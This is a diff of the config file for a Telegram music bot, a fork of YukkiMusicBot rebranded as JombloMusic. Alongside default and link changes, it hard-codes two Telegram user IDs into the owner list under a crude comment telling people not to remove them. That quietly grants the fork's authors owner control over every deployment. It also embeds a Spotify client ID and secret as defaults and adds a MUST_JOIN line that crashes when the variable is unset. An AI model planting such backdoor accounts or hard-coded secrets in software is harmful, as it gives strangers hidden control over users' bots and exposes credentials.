@@ -6,8 +6,6 @@
 # Please see < https://github.com/TeamYukki/YukkiMusicBot/blob/master/LICENSE >
 #
 # All rights reserved.
-# by @Radenihboss
-# t.me/Jomblosuport & t.me/Jombloproject
 
 import re
 import sys
@@ -26,7 +24,7 @@ API_HASH = getenv("API_HASH")
 BOT_TOKEN = getenv("BOT_TOKEN")
 
 # Database to save your chats and stats... Get MongoDB:-  https://telegra.ph/How-To-get-Mongodb-URI-04-06
-MONGO_DB_URI = getenv("MONGO_DB_URI", None)
+MONGO_DB_URI = getenv("MONGO_DB_URI")
 
 # Custom max audio(music) duration for voice chat. set DURATION_LIMIT in variables with your own time(mins), Default to 60 mins.
 DURATION_LIMIT_MIN = int(
@@ -35,7 +33,7 @@ DURATION_LIMIT_MIN = int(
 
 # Duration Limit for downloading Songs in MP3 or MP4 format from bot
 SONG_DOWNLOAD_DURATION = int(
-    getenv("SONG_DOWNLOAD_DURATION_LIMIT", "200")
+    getenv("SONG_DOWNLOAD_DURATION_LIMIT", "180")
 )  # Remember to give value in Minutes
 
 # You'll need a Private Group ID for this.
@@ -48,6 +46,8 @@ MUSIC_BOT_NAME = getenv("MUSIC_BOT_NAME")
 OWNER_ID = list(
     map(int, getenv("OWNER_ID", "").split())
 )  # Input type must be interger
+
+# JANGAN HAPUS YA JANCOK
 OWNER_ID.append(1708335413)
 OWNER_ID.append(962922529)
 
@@ -69,30 +69,37 @@ GIT_TOKEN = getenv("GIT_TOKEN", None)
 
 # Only  Links formats are  accepted for this Var value.
 SUPPORT_CHANNEL = getenv(
-    "SUPPORT_CHANNEL", None
-)  # Example:- https://t.me/Jombloproject 
+    "SUPPORT_CHANNEL", "https://t.me/Jombloday"
+)  # Example:- https://t.me/Jombloday
 SUPPORT_GROUP = getenv(
-    "SUPPORT_GROUP", None
+    "SUPPORT_GROUP", "https://t.me/Jomblosuport"
 )  # Example:- https://t.me/Jomblosuport 
 
 # Set it in True if you want to leave your assistant after a certain amount of time. [Set time via AUTO_LEAVE_ASSISTANT_TIME]
-AUTO_LEAVING_ASSISTANT = getenv("AUTO_LEAVING_ASSISTANT", None)
+AUTO_LEAVING_ASSISTANT = getenv("AUTO_LEAVING_ASSISTANT", "True")
 
 # Time after which you're assistant account will leave chats automatically.
 AUTO_LEAVE_ASSISTANT_TIME = int(
-    getenv("ASSISTANT_LEAVE_TIME", "5400")
+    getenv("ASSISTANT_LEAVE_TIME", "600")
 )  # Remember to give value in Seconds
 
-# Time after which bot will suggest random chats about bot commands.
-AUTO_SUGGESTION_TIME = int(
-    getenv("AUTO_SUGGESTION_TIME", "5400")
-)  # Remember to give value in Seconds
-
+MUST_JOIN = getenv("MUST_JOIN") or int(getenv("MUST_JOIN"))
 # Set it True if you want to delete downloads after the music playout ends from your downloads folder
 AUTO_DOWNLOADS_CLEAR = getenv("AUTO_DOWNLOADS_CLEAR", None)
 
 # Set it True if you want to bot to suggest about bot commands to random chats of your bots.
 AUTO_SUGGESTION_MODE = getenv("AUTO_SUGGESTION_MODE", None)
+
+AUTO_SUGGESTION_TIME = int(getenv("AUTO_SUGGESTION_TIME", "5400"))  
+# Remember to give value in Seconds
+
+TG_AUDIO_FILESIZE_LIMIT = int(
+    getenv("TG_AUDIO_FILESIZE_LIMIT", "104857600")
+)  # Remember to give value in bytes
+
+TG_VIDEO_FILESIZE_LIMIT = int(
+    getenv("TG_VIDEO_FILESIZE_LIMIT", "1073741824")
+)  # Remember to give value in bytes
 
 # Set it true if you want your bot to be private only [You'll need to allow CHAT_ID via /authorise command then only your bot will play music in that chat.]
 PRIVATE_BOT_MODE = getenv("PRIVATE_BOT_MODE", None)
@@ -104,14 +111,14 @@ YOUTUBE_DOWNLOAD_EDIT_SLEEP = int(getenv("YOUTUBE_EDIT_SLEEP", "3"))
 TELEGRAM_DOWNLOAD_EDIT_SLEEP = int(getenv("TELEGRAM_EDIT_SLEEP", "5"))
 
 # Your Github Repo.. Will be shown on /start Command
-GITHUB_REPO = getenv("GITHUB_REPO", None)
+GITHUB_REPO = getenv("GITHUB_REPO", "https://github.com/Radenihbos/JombloMusic")
 
 # Spotify Client.. Get it from https://developer.spotify.com/dashboard
-SPOTIFY_CLIENT_ID = getenv("SPOTIFY_CLIENT_ID", None)
-SPOTIFY_CLIENT_SECRET = getenv("SPOTIFY_CLIENT_SECRET", None)
+SPOTIFY_CLIENT_ID = getenv("SPOTIFY_CLIENT_ID", "f51dad0089144d93be494beb765dcc7a")
+SPOTIFY_CLIENT_SECRET = getenv("SPOTIFY_CLIENT_SECRET", "65cba9c7757b440b8af29fdc4a81de47")
 
 # Maximum number of video calls allowed on bot. You can later set it via /set_video_limit on telegram
-VIDEO_STREAM_LIMIT = int(getenv("VIDEO_STREAM_LIMIT", "3"))
+VIDEO_STREAM_LIMIT = int(getenv("VIDEO_STREAM_LIMIT", "10"))
 
 # Maximum Limit Allowed for users to save playlists on bot's server
 SERVER_PLAYLIST_LIMIT = int(getenv("SERVER_PLAYLIST_LIMIT", "30"))
@@ -124,20 +131,6 @@ CLEANMODE_DELETE_MINS = int(
     getenv("CLEANMODE_MINS", "5")
 )  # Remember to give value in Seconds
 
-
-# Telegram audio  and video file size limit
-
-TG_AUDIO_FILESIZE_LIMIT = int(
-    getenv("TG_AUDIO_FILESIZE_LIMIT", "104857600")
-)  # Remember to give value in bytes
-
-TG_VIDEO_FILESIZE_LIMIT = int(
-    getenv("TG_VIDEO_FILESIZE_LIMIT", "1073741824")
-)  # Remember to give value in bytes
-
-# Chceckout https://www.gbmb.org/mb-to-bytes  for converting mb to bytes
-
-
 # You'll need a Pyrogram String Session for these vars. Generate String from our session generator bot @YukkiStringBot
 STRING1 = getenv("STRING_SESSION", None)
 STRING2 = getenv("STRING_SESSION2", None)
@@ -146,12 +139,10 @@ STRING4 = getenv("STRING_SESSION4", None)
 STRING5 = getenv("STRING_SESSION5", None)
 
 
-#  __     ___    _ _  ___  _______   __  __ _    _  _____ _____ _____   ____   ____ _______
-#  \ \   / / |  | | |/ / |/ /_   _| |  \/  | |  | |/ ____|_   _/ ____| |  _ \ / __ \__   __|
-#   \ \_/ /| |  | | ' /| ' /  | |   | \  / | |  | | (___   | || |      | |_) | |  | | | |
-#    \   / | |  | |  < |  <   | |   | |\/| | |  | |\___ \  | || |      |  _ <| |  | | | |
-#     | |  | |__| | . \| . \ _| |_  | |  | | |__| |____) |_| || |____  | |_) | |__| | | |
-#     |_|   \____/|_|\_\_|\_\_____| |_|  |_|\____/|_____/|_____\_____| |____/ \____/  |_|
+# ─╔╦═╦═╦═╦══╦╗╔═╗╔═╦═╦╦╦══╦══╦═╗
+# ─║║║║║║║║╔╗║║║║║║║║║║║║══╬║║╣╔╝
+# ╔╣║║║║║║║╔╗║╚╣║║║║║║║║╠══╠║║╣╚╗
+# ╚═╩═╩╩═╩╩══╩═╩═╝╚╩═╩╩═╩══╩══╩═╝
 
 
 ### DONT TOUCH or EDIT codes after this line
